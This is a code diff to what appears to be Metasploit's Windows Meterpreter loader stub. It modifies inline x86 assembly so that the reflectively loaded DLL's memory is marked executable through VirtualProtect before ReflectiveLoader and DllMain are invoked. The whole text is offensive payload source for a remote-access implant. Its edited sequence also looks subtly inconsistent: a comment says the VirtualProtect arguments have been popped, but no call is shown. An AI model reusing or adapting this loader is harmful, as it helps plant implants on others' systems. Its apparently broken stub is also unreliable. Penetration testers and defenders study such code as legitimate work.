@@ -32,6 +32,7 @@ module Payload::Windows::MeterpreterLoader
 
   def asm_invoke_metsrv(opts={})
     asm = %Q^
+        ; Now, ebp=api_call
         ; prologue
           pop edx               ; 'Z'
           dec ebp               ; 'M'
@@ -39,13 +40,26 @@ module Payload::Windows::MeterpreterLoader
           pop ebx               ; get the current location (+7 bytes)
           push edx              ; restore edx
           inc ebp               ; restore ebp
-          push ebp              ; save ebp for later
-          mov ebp, esp          ; set up a new stack frame
-        ; Invoke ReflectiveLoader()
+          ; Invoke ReflectiveLoader()
           ; add the offset to ReflectiveLoader() (0x????????)
           add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
+
+          ; Make mem from ReflectiveLoader to the end of DLL RX
+          push 0               ; tmp var for holding old protect bits 
+          push esp             ; push address of the tmp var
+          push 0x20            ; PAGE_EXECUTE_READ
+          push #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+          push ebx             
+          push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualProtect')}
+
+          ; pop the tmp var. The params for VirtualProtect have been popped
+          pop eax
+
+          mov ebp, esp          ; set up a new stack frame
           call ebx              ; invoke ReflectiveLoader()
-        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
+
+          ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
+
           ; offset from ReflectiveLoader() to the end of the DLL
           add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
     ^
